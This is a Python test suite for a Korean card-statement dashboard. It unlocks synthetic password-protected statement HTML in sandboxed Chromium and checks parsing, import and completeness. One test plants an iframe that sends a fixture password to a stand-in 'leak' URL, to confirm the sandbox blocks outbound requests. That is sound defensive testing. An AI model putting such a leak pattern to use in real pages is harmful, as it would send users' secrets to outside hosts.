"""검증 범위: 격리된 HTML 판독과 완전성 확인.

실제 명세서·비밀번호 대신 가상 데이터와 임시 DB를 사용합니다.
브라우저가 필요한 검증은 MOA_BROWSER_TESTS=1인 환경에서 실행합니다.
"""

import io
import json
import subprocess
import shutil
import os
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from app import app, previews, secure_tables, expire_preview, connect
from auth import set_password
from secure_html import unlock_statement, StatementReadError

HEADERS = {"X-Requested-With": "CardDashboard"}
TABLES = [
    [
        ["이용일자", "가맹점명", "이용금액"],
        ["2026-10-03", "가상 상점", "42,000"],
        ["2026-10-06", "가상 환불", "-12,000"],
    ]
]
# Public, synthetic fixture. No customer document, credentials, or transactions.
FIXTURE = """<!doctype html><input id="password" type="password"><button id="confirm">열기</button>
<script>document.getElementById('confirm').onclick=()=>{
 if(document.getElementById('password').value!=='fixture-only'){alert('wrong');return;}
 let frame=document.createElement('iframe');
 frame.srcdoc='<table><tr><th>이용일자</th><th>가맹점명</th><th>이용금액</th></tr><tr><td>2026-10-03</td><td>가상 상점</td><td>42000</td></tr></table>';
 document.body.append(frame);
};</script>"""


HYUNDAI_FIXTURE = """<!doctype html><form name="decForm" id="decForm" onsubmit="doAction();return false">
<input type="password" name="p2" id="password" maxlength="7" style="display:none">
<input type="text" name="p2_temp" value="비밀번호 안내" onfocus="reveal()">
<input type="image" alt="보안메일 확인" width="100" height="30">
<input type="image" alt="보안메일 확인" style="display:none"></form>
<script src="https://www.hyundaicard.com/scripts/optional-fixture.js"></script>
<script>
function reveal(){document.querySelector('[name=p2_temp]').style.display='none';document.querySelector('#password').style.display='inline';document.querySelector('#password').focus();}
function vestmail_onstart(){}
function vestmail_onend(success){}
function doAction(){
 vestmail_onstart();
 if(document.querySelector('#password').value!=='fixture'){vestmail_onend(false);alert('wrong');return;}
 vestmail_onend(true);
 const frame=document.createElement('iframe');
 frame.srcdoc='<table><tr><th>이용일자</th><th>이용가맹점</th><th>이용금액</th></tr><tr><td>2026-10-03</td><td>가상 현대 상점</td><td>42000</td></tr></table>';
 document.body.append(frame);
}
</script>"""


# Synthetic Woori-style CP949 form and iframe; no customer content.
WOORI_FIXTURE = """<!doctype html><meta charset="euc-kr">
<form id="decForm" name="decForm" onsubmit="doAction();return false">
<input id="password" type="password"><input id="confirm" type="submit" value="확인"></form>
<iframe id="cipher" name="cipher"></iframe><script>
function vestmail_onstart(){}
function vestmail_onend(success){}
function doAction(){
 vestmail_onstart();
 if(document.querySelector('#password').value!=='fixture-only'){vestmail_onend(false);alert('wrong');return;}
 if(navigator.platform!=='Linux i686')return;
 const doc=document.querySelector('#cipher').contentDocument;
 doc.open();doc.write('<table><tr><th>이용일자</th><th>가맹점명</th><th>이용금액</th><th>청구금액</th></tr><tr><td>2026.10.03</td><td>가상 우리 가맹점</td><td>42000</td><td>14000</td></tr><tr><td>2026.10.04</td><td>가상 우리 환불</td><td>-3000</td><td>-3000</td></tr></table>');doc.close();
 vestmail_onend(true);
}
</script>"""


class SecureApiTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        app.config.update(
            TESTING=True, PUBLIC_ORIGIN="", DATABASE=str(Path(self.tmp.name) / "test.sqlite3")
        )
        self.client = app.test_client()
        previews.clear()
        secure_tables.clear()
        set_password(connect, "fixture-login-password")
        self.client.post("/api/login", json={"password": "fixture-login-password"}, headers=HEADERS)

    def tearDown(self):
        self.tmp.cleanup()

    def submit(self):
        return self.client.post(
            "/api/secure-html",
            data={
                "file": (io.BytesIO(b"<html>fixture</html>"), "fixture.html"),
                "password": "fixture-only",
            },
            headers=HEADERS,
        )

    @patch("app.unlock_statement", return_value=TABLES)
    def test_preview_save_expiry_and_no_password_in_state(self, reader):
        result = self.submit()
        self.assertEqual(result.status_code, 200)
        self.assertEqual(result.headers["Cache-Control"], "no-store")
        self.assertNotIn("fixture-only", str(secure_tables))
        self.assertEqual(self.client.get("/api/data").json["transactions"], [])
        token = result.json["token"]
        preview = self.client.post(
            "/api/secure-preview",
            json={"token": token, "table": 0, "header": 1, "end": 3},
            headers=HEADERS,
        ).json
        payload = {"token": preview["token"], "card": "신한", "date": 0, "merchant": 1, "amount": 2}
        self.assertEqual(
            self.client.post("/api/import", json=payload, headers=HEADERS).status_code, 400
        )
        payload["card"] = "삼성"
        self.assertEqual(
            self.client.post("/api/import", json=payload, headers=HEADERS).json["count"], 2
        )
        transactions = self.client.get("/api/data").json["transactions"]
        self.assertEqual(sum(t["amount"] for t in transactions), 30000)
        expire_preview(preview["token"])
        expire_preview(token)
        self.assertNotIn(token, secure_tables)
        self.assertNotIn(preview["token"], previews)

    @patch("app.unlock_statement", return_value=TABLES)
    def test_online_connection_requires_explicit_form_choice(self, reader):
        self.submit()
        reader.assert_called_once_with(b"<html>fixture</html>", "fixture-only", card="삼성")
        reader.reset_mock()
        response = self.client.post(
            "/api/secure-html",
            data={
                "file": (io.BytesIO(b"<html>fixture</html>"), "fixture.html"),
                "password": "fixture-only",
                "allow_online": "1",
            },
            headers=HEADERS,
        )
        self.assertEqual(response.status_code, 200)
        reader.assert_called_once_with(
            b"<html>fixture</html>", "fixture-only", card="삼성", allow_online=True
        )

    @patch(
        "app.unlock_statement",
        side_effect=StatementReadError(
            "가상 오류", {"schema": 1, "fictional": True, "html": "<table>xxxx</table>"}
        ),
    )
    def test_failed_reader_returns_fictional_structure_without_saving(self, reader):
        response = self.submit()
        self.assertEqual(response.status_code, 400)
        self.assertTrue(response.json["structure"]["fictional"])
        self.assertEqual(secure_tables, {})

    @patch("app.unlock_statement", return_value=TABLES)
    def test_woori_html_preview_and_save_keep_card_identity(self, reader):
        result = self.client.post(
            "/api/secure-html",
            data={
                "card": "우리",
                "file": (io.BytesIO(b"<html>fixture</html>"), "WooriCard.html"),
                "password": "fixture-only",
            },
            headers=HEADERS,
        )
        self.assertEqual(result.status_code, 200)
        reader.assert_called_once_with(b"<html>fixture</html>", "fixture-only", card="우리")
        preview = self.client.post(
            "/api/secure-preview",
            json={"token": result.json["token"], "table": 0, "header": 1, "end": 3},
            headers=HEADERS,
        ).json
        self.assertEqual(preview["card"], "우리")
        result = self.client.post(
            "/api/import",
            json={"token": preview["token"], "card": "우리", "date": 0, "merchant": 1, "amount": 2},
            headers=HEADERS,
        )
        self.assertEqual(result.status_code, 200)
        self.assertEqual(
            {row["card"] for row in self.client.get("/api/data").json["transactions"]}, {"우리"}
        )

    def test_woori_does_not_enable_samsung_network_access(self):
        with self.assertRaisesRegex(ValueError, "삼성카드만"):
            unlock_statement(
                b"<html>fixture</html>", "fixture-only", card="우리", allow_online=True
            )

    @patch("app.unlock_statement", return_value=TABLES)
    def test_hyundai_html_preview_keeps_card_identity(self, reader):
        response = self.client.post(
            "/api/secure-html",
            data={
                "card": "현대",
                "file": (io.BytesIO(b"<html>fixture</html>"), "hyundai.html"),
                "password": "fixture",
            },
            headers=HEADERS,
        )
        self.assertEqual(response.status_code, 200)
        reader.assert_called_once_with(b"<html>fixture</html>", "fixture", card="현대")
        token = response.json["token"]
        preview = self.client.post(
            "/api/secure-preview",
            json={"token": token, "table": 0, "header": 1, "end": 3},
            headers=HEADERS,
        ).json
        self.assertEqual(preview["card"], "현대")

    def test_hyundai_does_not_enable_samsung_network_access(self):
        with self.assertRaisesRegex(ValueError, "삼성카드만"):
            unlock_statement(b"<html>fixture</html>", "fixture", card="현대", allow_online=True)

    @patch("app.unlock_statement", side_effect=ValueError("명세서가 열리지 않았습니다."))
    def test_failure_has_no_saved_data(self, reader):
        response = self.submit()
        self.assertEqual(response.status_code, 400)
        self.assertNotIn("fixture-only", response.text)
        self.assertEqual(secure_tables, {})
        self.assertEqual(self.client.get("/api/data").json["imports"], [])

    def test_required_file_and_password(self):
        self.assertEqual(self.client.post("/api/secure-html", headers=HEADERS).status_code, 400)
        response = self.client.post(
            "/api/secure-html", data={"file": (io.BytesIO(b"<html>"), "test.html")}, headers=HEADERS
        )
        self.assertEqual(response.status_code, 400)
        self.assertIn("비밀번호", response.json["error"])

    @patch(
        "app.unlock_statement",
        return_value=[[["이용일자", "가맹점명", "이용금액"], ["10.03", "가상 상점", "42000"]]],
    )
    def test_explicit_year_for_month_day(self, reader):
        result = self.client.post(
            "/api/secure-html",
            data={
                "file": (io.BytesIO(b"<html>"), "fixture.html"),
                "password": "fixture-only",
                "year": "2026",
            },
            headers=HEADERS,
        )
        self.assertEqual(result.status_code, 200)
        preview = self.client.post(
            "/api/secure-preview",
            json={"token": result.json["token"], "table": 0, "header": 1, "end": 2},
            headers=HEADERS,
        ).json
        saved = self.client.post(
            "/api/import",
            json={"token": preview["token"], "card": "삼성", "date": 0, "merchant": 1, "amount": 2},
            headers=HEADERS,
        )
        self.assertEqual(saved.status_code, 200)
        self.assertEqual(
            self.client.get("/api/data").json["transactions"][0]["used_on"], "2026-10-03"
        )

    def test_spaced_short_dates_still_require_matching_explicit_year(self):
        from app import parse_statement_date

        self.assertEqual(parse_statement_date("26. 9. 8", 2026), "2026-09-08")
        self.assertEqual(parse_statement_date("2026. 9. 8"), "2026-09-08")
        with self.assertRaises(ValueError):
            parse_statement_date("26. 9. 8")
        with self.assertRaises(ValueError):
            parse_statement_date("26. 9. 8", 2025)

    def test_applied_year_that_makes_a_future_date_is_rejected(self):
        """적용 연도를 한 해 늦게 넣으면(실제 사례: 2026년 10월 이용분을 2027로) 저장 전에 멈춥니다."""
        from datetime import date, timedelta
        from app import parse_statement_date

        tomorrow = date.today() + timedelta(days=2)
        with self.assertRaisesRegex(ValueError, "적용 연도를 확인"):
            parse_statement_date(f"{tomorrow.month}/{tomorrow.day}", tomorrow.year)
        with self.assertRaisesRegex(ValueError, "적용 연도를 확인"):
            parse_statement_date("10/10", date.today().year + 1)
        # 연도가 적힌 날짜는 그대로 읽고, 지난 날짜는 적용 연도로 만들어도 됩니다.
        last_month = date.today().replace(day=1) - timedelta(days=1)
        self.assertEqual(
            parse_statement_date(f"{last_month.month}/{last_month.day}", last_month.year),
            last_month.isoformat(),
        )

    def test_short_dates_never_guess_the_year(self):
        from app import parse_statement_date

        with self.assertRaises(ValueError):
            parse_statement_date("10.03")
        with self.assertRaises(ValueError):
            parse_statement_date("25.10.03", 2026)
        self.assertEqual(parse_statement_date("26.10.03", 2026), "2026-10-03")
        self.assertEqual(parse_statement_date("26.9.8", 2026), "2026-09-08")
        with self.assertRaises(ValueError):
            parse_statement_date("02.30", 2026)

    @patch(
        "app.unlock_statement",
        return_value=[
            [["이용일자", "가맹점명", "이용금액"], ["8.18", "가상 매장", "50000"]],
            [["이용일자", "가맹점명", "이용금액"], ["8.02", "가상 취소", "-10000"]],
        ],
    )
    def test_lotte_card_and_separate_cancellation_table(self, reader):
        response = self.client.post(
            "/api/secure-html",
            data={
                "file": (io.BytesIO(b"<html>"), "lotte-fixture.html"),
                "password": "fixture-only",
                "card": "롯데",
                "year": "2026",
            },
            headers=HEADERS,
        )
        self.assertEqual(response.status_code, 200)
        reader.assert_called_once_with(b"<html>", "fixture-only", card="롯데")
        for index in (0, 1):
            preview = self.client.post(
                "/api/secure-preview",
                json={"token": response.json["token"], "table": index, "header": 1, "end": 2},
                headers=HEADERS,
            ).json
            self.assertEqual(preview["card"], "롯데")
            payload = {
                "token": preview["token"],
                "card": "롯데",
                "date": 0,
                "merchant": 1,
                "amount": 2,
            }
            self.assertEqual(
                self.client.post("/api/import", json=payload, headers=HEADERS).status_code, 200
            )
            self.assertEqual(
                self.client.post("/api/import", json=payload, headers=HEADERS).status_code, 409
            )
        data = self.client.get("/api/data").json
        self.assertEqual(len(data["imports"]), 2)
        self.assertEqual(sum(t["amount"] for t in data["transactions"]), 40000)
        self.assertEqual({t["card"] for t in data["transactions"]}, {"롯데"})
        db = connect()
        with db:
            db.execute(
                "INSERT INTO imports(card,filename,digest) VALUES(?,?,?)",
                ("롯데", "legacy-fixture.html", secure_tables[response.json["token"]]["digest"]),
            )
        db.close()
        blocked = self.client.post(
            "/api/secure-preview",
            json={"token": response.json["token"], "table": 0, "header": 1, "end": 2},
            headers=HEADERS,
        )
        self.assertEqual(blocked.status_code, 409)


@unittest.skipUnless(
    os.environ.get("MOA_BROWSER_TESTS") == "1",
    "set MOA_BROWSER_TESTS=1 for sandboxed Chromium integration",
)
class BrowserTests(unittest.TestCase):
    def test_valid_password_extracts_subframe_table(self):
        result = unlock_statement(FIXTURE.encode(), "fixture-only")
        self.assertEqual(result[0][1], ["2026-10-03", "가상 상점", "42000"])

    def test_samsung_legacy_platform_keeps_cipher_frame(self):
        fixture = FIXTURE.replace(
            "let frame=document.createElement('iframe');",
            """
        if(!['Win32','MacIntel','iPad','Linux i686','Linux x686'].includes(navigator.platform)) return;
        let frame=document.createElement('iframe');
        """,
        )
        tables = unlock_statement(fixture.encode(), "fixture-only")
        self.assertEqual(tables[0][1], ["2026-10-03", "가상 상점", "42000"])

    def test_document_write_snapshot_survives_cleared_screen(self):
        markup = '<table><tr><th>이용일자</th><th>가맹점명</th><th>이용금액</th></tr><tr><td>2026-10-03</td><td>가상 상점</td><td>42000</td></tr></table><script>document.body.innerHTML="";</script>'
        fixture = (
            '<form onsubmit="doAction();return false"><input id="password"><input id="confirm" type="submit"></form><script>window.doAction=()=>{document.open();document.write('
            + json.dumps(markup).replace("<", chr(92) + "u003c")
            + ");document.close();};</script>"
        )
        tables = unlock_statement(fixture.encode(), "fixture-only")
        self.assertEqual(tables[0][1], ["2026-10-03", "가상 상점", "42000"])

    def test_written_snapshot_with_more_cannot_import_partial_rows(self):
        markup = '<table><tr><th>이용일자</th><th>가맹점명</th><th>이용금액</th></tr><tr><td>2026-10-03</td><td>가상 상점</td><td>42000</td></tr></table><button>더보기</button><script>document.body.innerHTML="";</script>'
        fixture = (
            '<form onsubmit="doAction();return false"><input id="password"><input id="confirm" type="submit"></form><script>window.doAction=()=>{document.open();document.write('
            + json.dumps(markup).replace("<", chr(92) + "u003c")
            + ");document.close();};</script>"
        )
        with self.assertRaisesRegex(ValueError, "일부 내역만 저장"):
            unlock_statement(fixture.encode(), "fixture-only")

    def test_online_statement_is_distinguished_without_disclosing_url(self):
        markup = '<form action="https://bill.samsungcard.com/private?token=fixture-sensitive"><button>명세서 보기</button></form>'
        fixture = (
            '<form onsubmit="doAction();return false"><input id="password"><input id="confirm" type="submit"></form><script>window.doAction=()=>{document.open();document.write('
            + json.dumps(markup).replace("<", chr(92) + "u003c")
            + ");document.close();};</script>"
        )
        with self.assertRaisesRegex(ValueError, "외부 웹페이지") as caught:
            unlock_statement(fixture.encode(), "fixture-only")
        self.assertIn("삼성 이동 대상 1", str(caught.exception))
        self.assertNotIn("fixture-sensitive", str(caught.exception))
        self.assertNotIn("/private", str(caught.exception))

    def test_official_post_then_async_more_reads_all_records(self):
        markup = '<form id="go" method="post" action="https://bill.samsungcard.com/fixture"><input name="token" value="fixture-token"></form><script>document.querySelector("#go").submit()</script>'
        fixture = (
            '<form onsubmit="doAction();return false"><input id="password"><input id="confirm" type="submit"></form><script>window.doAction=()=>{document.open();document.write('
            + json.dumps(markup).replace("<", chr(92) + "u003c")
            + ");document.close();};</script>"
        )
        wrapper = r"""
const network=require('./scripts/samsung-network.cjs');
network.fetchSamsung=async request=>{
 if(request.url()==='https://bill.samsungcard.com/fixture'&&request.method()==='POST'&&request.postDataBuffer().toString()==='token=fixture-token')return {status:200,headers:{'set-cookie':'fixture-session=1; Secure; HttpOnly; SameSite=Lax'},contentType:'text/html; charset=utf-8',body:`<p>소계 총 3건</p><ul id="rows"><li><span>26.9.8</span><strong>가상 상점 A</strong><span>12,000원</span></li><li><span>26.9.9</span><strong>가상 상점 B</strong><span>8,000원</span></li></ul><div role="button" tabindex="0" onclick="loadMore()">더 보기</div><script>async function loadMore(){const html=await(await fetch('/more')).text();document.querySelector('#rows').insertAdjacentHTML('beforeend',html);document.querySelector('[role=button]').remove();}</script>`};
 if(request.url()==='https://bill.samsungcard.com/more'&&(await request.allHeaders()).cookie?.includes('fixture-session=1')){
  await new Promise(r=>setTimeout(r,6200));
  return {status:200,contentType:'text/html; charset=utf-8',body:'<li><span>26.9.10</span><strong>가상 상점 C</strong><span>5,000원</span></li>'};
 }
 throw new Error('unexpected fixture request');
};
require('./scripts/unlock.cjs');
"""
        for target in ["", "_blank"]:
            framed = markup.replace(
                "id=" + chr(34) + "go" + chr(34),
                "id=" + chr(34) + "go" + chr(34) + " target=" + chr(34) + target + chr(34),
            )
            document = fixture.replace(
                json.dumps(markup).replace("<", chr(92) + "u003c"),
                json.dumps(framed).replace("<", chr(92) + "u003c"),
            )
            self.assertIn("target=", document)
            result = subprocess.run(
                ["node", "-e", wrapper],
                cwd=Path(__file__).resolve().parents[1],
                input=json.dumps(
                    dict(html=document, password="fixture-only", card="삼성", allowOnline=True)
                ).encode(),
                capture_output=True,
                timeout=55,
                env={**os.environ, "MOA_CHROMIUM": shutil.which("chromium")},
            )
            output = json.loads(result.stdout)
            self.assertIn("tables", output)
            self.assertEqual(len(output["tables"][0]), 4)
            self.assertEqual(output["tables"][0][-1][1], "가상 상점 C")

    def test_woori_cp949_submit_and_existing_cipher_frame(self):
        tables = unlock_statement(WOORI_FIXTURE.encode("cp949"), "fixture-only", card="우리")
        self.assertEqual(tables[0][0], ["이용일자", "가맹점명", "이용금액", "청구금액"])
        self.assertEqual(tables[0][1], ["2026.10.03", "가상 우리 가맹점", "42000", "14000"])
        self.assertEqual(tables[0][2][2], "-3000")

    def test_woori_wrong_password_is_rejected(self):
        with self.assertRaisesRegex(ValueError, "열리지"):
            unlock_statement(WOORI_FIXTURE.encode("cp949"), "wrong", card="우리")

    def test_hyundai_cp949_hidden_input_and_image_submit(self):
        tables = unlock_statement(HYUNDAI_FIXTURE.encode("cp949"), "fixture", card="현대")
        self.assertEqual(tables[0][1], ["2026-10-03", "가상 현대 상점", "42000"])

    def test_hyundai_wrong_password_is_rejected(self):
        with self.assertRaisesRegex(ValueError, "열리지"):
            unlock_statement(HYUNDAI_FIXTURE.encode("cp949"), "wrong", card="현대")

    def test_wrong_password_is_rejected(self):
        with self.assertRaisesRegex(ValueError, "열리지"):
            unlock_statement(FIXTURE.encode(), "fixture-wrong")

    def test_outbound_requests_are_intercepted(self):
        fixture = FIXTURE.replace(
            "document.body.append(frame);",
            "document.body.append(frame); let blocked=document.createElement('iframe'); blocked.src='https://statement.invalid/leak?secret=fixture-only'; document.body.append(blocked);",
        )
        root = Path(__file__).resolve().parents[1]
        result = subprocess.run(
            ["node", str(root / "scripts/unlock.cjs")],
            input=json.dumps({"html": fixture, "password": "fixture-only"}),
            text=True,
            capture_output=True,
            timeout=30,
            env={**os.environ, "MOA_CHROMIUM": shutil.which("chromium")},
        )
        output = json.loads(result.stdout)
        self.assertEqual(output["tables"][0][1][1], "가상 상점")
        self.assertGreaterEqual(output["blockedRequests"], 1)

    def test_spaced_headers_and_merged_cells(self):
        table = '<table><tr><th rowspan="2">이용 일자</th><th rowspan="2">가 맹 점 명</th><th colspan="2">이용 금액</th></tr><tr><th>원화</th><th>외화</th></tr><tr><td>2026-10-03</td><td>가상 상점</td><td>42000</td><td>0</td></tr></table>'
        fixture = FIXTURE.replace("frame.srcdoc=", "frame.srcdoc=")
        start = fixture.index("frame.srcdoc='") + len("frame.srcdoc='")
        end = fixture.index("';", start)
        fixture = fixture[:start] + table + fixture[end:]
        result = unlock_statement(fixture.encode(), "fixture-only")
        self.assertEqual(result[0][1], ["2026-10-03", "가상 상점", "42000", "0"])
        self.assertIn("원화", result[0][0][2])

    def test_header_aliases_and_nested_layout(self):
        table = "<table><tr><td><table><tr><th>매출 일자</th><th>업체명</th><th>청구액</th></tr><tr><td>2026-10-03</td><td>가상 상점</td><td>42000</td></tr></table></td></tr></table>"
        start = FIXTURE.index("frame.srcdoc='") + len("frame.srcdoc='")
        end = FIXTURE.index("';", start)
        result = unlock_statement(
            (FIXTURE[:start] + table + FIXTURE[end:]).encode(), "fixture-only"
        )
        self.assertEqual(len(result), 1)
        self.assertEqual(result[0][1][1], "가상 상점")

    def test_unknown_headers_offer_manual_mapping(self):
        table = "<table><tr><td>2026-10-03</td><td>가상 상점</td><td>42000</td></tr><tr><td>2026-10-04</td><td>가상 서점</td><td>5000</td></tr></table>"
        start = FIXTURE.index("frame.srcdoc='") + len("frame.srcdoc='")
        end = FIXTURE.index("';", start)
        result = unlock_statement(
            (FIXTURE[:start] + table + FIXTURE[end:]).encode(), "fixture-only"
        )
        self.assertEqual(result[0][0], ["열 1", "열 2", "열 3"])
        self.assertEqual(len(result[0]), 3)

    def test_confirmed_unlock_without_table_is_distinct(self):
        # Vendor completion callbacks are observed, never forced to succeed.
        fixture = FIXTURE.replace(
            "document.body.append(frame);", "window.hubmail_onend(true);"
        ).replace("<script>", "<script>window.hubmail_onend=()=>{};")
        with self.assertRaisesRegex(ValueError, "해제 완료 응답"):
            unlock_statement(fixture.encode(), "fixture-only")

    def list_fixture(self, content):
        start = FIXTURE.index("frame.srcdoc='") + len("frame.srcdoc='")
        end = FIXTURE.index("';", start)
        return (FIXTURE[:start] + content + FIXTURE[end:]).encode()

    def test_card_list_with_summary_and_refund(self):
        content = "<div>이번 달 결제금액</div><strong>999,000원</strong><ul><li><span>2026.10.03</span><strong>가상 마트</strong><span>42,000원</span><span>일시불</span></li><li><span>2026.10.06</span><strong>가상 마트</strong><span>12,000원</span><span>취소</span></li></ul>"
        result = unlock_statement(self.list_fixture(content), "fixture-only")
        self.assertEqual(result[0][1][:3], ["2026.10.03", "가상 마트", "42000"])
        self.assertEqual(result[0][2][:3], ["2026.10.06", "가상 마트", "-12000"])
        self.assertEqual(len(result[0]), 3)

    def test_duplicate_list_transactions_with_separate_currency_unit(self):
        item = "<article><span>2026-10-03</span><span>가상 카페</span><span>5,000</span><small>원</small></article>"
        result = unlock_statement(self.list_fixture(item + item), "fixture-only")
        self.assertEqual(len(result[0]), 3)
        self.assertEqual(result[0][1], result[0][2])

    def test_installment_amount_columns_are_not_confused(self):
        content = "<article><div>10.03</div><strong>가상 상점</strong><div>이용금액</div><span>120,000원</span><div>청구금액</div><span>20,000원</span><span>이자액: 1,000원</span><span>할부</span></article>"
        result = unlock_statement(self.list_fixture(content), "fixture-only")
        self.assertEqual(result[0][0][2:4], ["이용금액", "청구금액"])
        self.assertEqual(result[0][1][2:4], ["120000", "20000"])
        self.assertEqual(result[0][0][4], "이자액")
        self.assertEqual(result[0][1][4], "1000")

    def test_ambiguous_amount_is_flagged(self):
        content = "<article><div>2026-10-03</div><strong>가상 상점</strong><span>42,000원</span></article><article><div>2026-10-04</div><strong>가상 환불</strong><span>42,000원</span><span>12,000원</span><span>부분취소</span></article>"
        result = unlock_statement(self.list_fixture(content), "fixture-only")
        self.assertEqual(len(result[0]), 3)
        self.assertEqual(result[0][2][2], "")
        self.assertIn("원문 확인", result[0][2][-1])

    def test_lotte_button_and_combined_date_merchant_cells(self):
        content = "<table><tr><th>이용내역</th><th>이용금액</th><th>할부회차</th><th>이번달 원금</th></tr><tr><td>8.18<br>가상 매장</td><td>50,000</td><td>1/5</td><td>10,000</td></tr><tr><td>카드이용합계</td><td>50,000</td><td></td><td>10,000</td></tr></table><table><tr><td>8.2<br>가상 취소</td><td>-10,000</td></tr></table>"
        fixture = (
            self.list_fixture(content)
            .decode()
            .replace('<button id="confirm">', '<button id="lotte-open" onclick="UserFunc();">')
            .replace("document.getElementById('confirm').onclick=()=>{", "window.UserFunc=()=>{")
        )
        result = unlock_statement(fixture.encode(), "fixture-only", card="롯데")
        self.assertEqual(len(result), 2)
        self.assertEqual(result[0][1], ["8.18", "가상 매장", "50,000", "1/5", "10,000"])
        self.assertEqual(len(result[0]), 2)
        self.assertEqual(result[1][1], ["8.2", "가상 취소", "-10,000"])

    def test_lotte_wrong_password(self):
        fixture = FIXTURE.replace(
            '<button id="confirm">', '<button id="lotte-open" onclick="UserFunc();">'
        ).replace("document.getElementById('confirm').onclick=()=>{", "window.UserFunc=()=>{")
        with self.assertRaisesRegex(ValueError, "열리지"):
            unlock_statement(fixture.encode(), "fixture-wrong", card="롯데")

    def test_samsung_short_date_and_multiline_merchant_in_button(self):
        content = '<div class="record"><button class="transaction"><span class="shop_name">가상 통신<br><span>123456</span></span><span class="money">12,340원</span><small>26.9.8 본인 4321</small></button></div>'
        result = unlock_statement(self.list_fixture(content), "fixture-only")
        self.assertEqual(result[0][1][:3], ["26.9.8", "가상 통신 123456", "12340"])

    def test_samsung_more_expands_hidden_records_before_return(self):
        record = (
            "<article><span>26.9.8</span><strong>가상 카페</strong><span>5,000원</span></article>"
        )
        content = (
            '<div class="subtotal">소계 <span>총 </span><em>2</em><span>건</span></div>'
            + record
            + '<div id="rest" style="display:none">'
            + record
            + '</div><button onclick="document.getElementById(&#39;rest&#39;).style.display=&#39;block&#39;;this.style.visibility=&#39;hidden&#39;">더보기 ↓</button>'
        )
        result = unlock_statement(self.list_fixture(content), "fixture-only")
        self.assertEqual(len(result[0]), 3)

    def test_samsung_css_expansion_with_unchanged_text_completes(self):
        record = (
            "<article><span>26.9.8</span><strong>가상 카페</strong><span>5,000원</span></article>"
        )
        content = (
            '<div>소계 2건</div><div id="clip" style="max-height:10px;overflow:hidden">'
            + record
            + record
            + '</div><button onclick="document.getElementById(&#39;clip&#39;).style.maxHeight=&#39;none&#39;;this.disabled=true">더보기</button>'
        )
        result = unlock_statement(self.list_fixture(content), "fixture-only")
        self.assertEqual(len(result[0]), 3)

    def test_samsung_spaced_dates_and_split_date_elements(self):
        for date in [
            "26. 9. 8",
            "<span>26.</span><span> 9.</span><span> 8</span>",
            "<span>26.</span><span> 9.</span><span> 8</span> 본인 4301",
        ]:
            content = (
                '<div>소계 1건</div><article><strong>가상 카페</strong><span class="date">'
                + date
                + "</span><span>5,000원</span></article>"
            )
            rows = unlock_statement(self.list_fixture(content), "fixture-only")[0]
            self.assertEqual(rows[1][:3], ["26.9.8", "가상 카페", "5000"])

    def test_hidden_password_field_does_not_hide_statement(self):
        content = '<div>소계 1건</div><form><input type="password" style="display:none"><article><strong>가상 카페</strong><span>26. 9. 8</span><span>5,000원</span></article></form>'
        rows = unlock_statement(self.list_fixture(content), "fixture-only")[0]
        self.assertEqual(len(rows), 2)

    def test_samsung_nested_tables_and_image_more_load_all_38_records(self):
        def record(index):
            return (
                "<table><tr><td>가상 상점 "
                + str(index)
                + '</td><td>5,000원</td></tr><tr><td colspan="2"><span>26. 9. 8</span><span> 본인 4301</span><span>승인정보</span></td></tr></table>'
            )

        initial = "".join(record(i) for i in range(25))
        rest = "".join(record(i) for i in range(25, 38))
        content = (
            "<div>소계 38건</div>"
            + initial
            + '<div id="rest" hidden>'
            + rest
            + '</div><a href="#rest" onclick="document.getElementById(&#39;rest&#39;).hidden=false;this.remove();return false"> &nbsp; <img alt="더보기 (25/38)" width="100" height="30"></a>'
        )
        for html in [
            content,
            content.replace(
                'alt="더보기 (25/38)"', 'src="https://bill.samsungcard.com/assets/btn_more.gif"'
            ),
        ]:
            rows = unlock_statement(self.list_fixture(html), "fixture-only")[0]
            self.assertEqual(len(rows), 39)
            self.assertEqual(rows[1][1], "가상 상점 0")
            self.assertEqual(rows[-1][1], "가상 상점 37")
            self.assertTrue(all(row[2] == "5000" for row in rows[1:]))

    def test_samsung_observed_nested_date_and_accessible_page_counter(self):
        def record(index, hidden=False, extra=False):
            return (
                "<li"
                + (" hidden" if hidden else "")
                + '><div><a href="#"><div class="name"><p class="store">가상 상점 '
                + str(index)
                + '</p></div><p><strong>5,000</strong>원</p><span><span><span>상세 내용 안내</span></span></span></a><div><p class="date"><span><span>이용일자</span>26. 9. 8</span></p><p>본 인 <span>4301</span></p>'
                + ("<p><span>별도 혜택 <span>-1,000원</span></span></p>" if extra else "")
                + "</div></div><div hidden><ul><li><span>이용금액</span><span>50,000원</span></li></ul></div></li>"
            )

        cash = (
            '<section><h2>일시불</h2><div><p>소계</p><p>총 <strong>36</strong>건</p></div><ul id="cash">'
            + "".join(record(i, hidden=i >= 10) for i in range(36))
            + "</ul>"
        )
        more = '<button onclick="Array.from(document.querySelectorAll(&#39;#cash li[hidden]&#39;)).slice(0,10).forEach(n=>n.hidden=false);document.getElementById(&#39;page&#39;).textContent=String(Number(document.getElementById(&#39;page&#39;).textContent)+1)"><span>더보기 <span>(<span>현재 목록 페이지</span><span id="page">1</span>/<span>전체 목록 페이지</span>4)</span></span><span></span></button></section>'
        installments = (
            "<section><h2>할부</h2><div><p>소계</p><p>총 <strong>2</strong>건</p></div><ul>"
            + record(36, extra=True)
            + record(37, extra=True)
            + "</ul></section>"
        )
        rows = unlock_statement(self.list_fixture(cash + more + installments), "fixture-only")[0]
        self.assertEqual(len(rows), 39)
        amount = rows[0].index("화면표시금액")
        extra = rows[0].index("추가표시금액")
        self.assertTrue(all(row[1] and row[amount] == "5000" for row in rows[1:]))
        self.assertEqual(sum(int(row[extra] or 0) for row in rows[1:]), -2000)
        self.assertTrue(all(row[0] == "26.9.8" for row in rows[1:]))

    def test_samsung_declared_count_prevents_partial_import(self):
        record = (
            "<article><span>26.9.8</span><strong>가상 카페</strong><span>5,000원</span></article>"
        )
        content = "<div>소계 <span>총 </span><em>3</em><span>건</span></div>" + record + record
        with self.assertRaisesRegex(ValueError, "일부 내역만 저장"):
            unlock_statement(self.list_fixture(content), "fixture-only")

    def test_samsung_stalled_more_never_returns_partial_success(self):
        content = "<div>소계 <em>2건</em></div><article><span>26.9.8</span><strong>가상 카페</strong><span>5,000원</span></article><button>더보기</button>"
        with self.assertRaisesRegex(StatementReadError, "일부 내역만 저장") as caught:
            unlock_statement(self.list_fixture(content), "fixture-only")
        self.assertTrue(caught.exception.structure["fictional"])
        self.assertNotIn("가상 카페", caught.exception.structure["html"])

